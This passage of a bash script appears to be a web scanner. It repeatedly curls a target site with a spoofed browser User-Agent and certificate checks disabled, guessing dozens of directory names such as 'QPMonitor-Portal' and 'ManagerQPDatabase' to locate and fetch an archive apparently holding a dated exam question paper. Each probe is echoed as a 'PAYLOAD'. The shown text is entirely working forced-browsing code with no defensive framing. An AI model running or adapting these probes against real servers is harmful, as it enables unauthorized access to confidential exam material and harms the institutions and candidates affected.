payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadManagement/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingCloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QPBFile/QP19_02_2025%2001_16_01.zip]:"
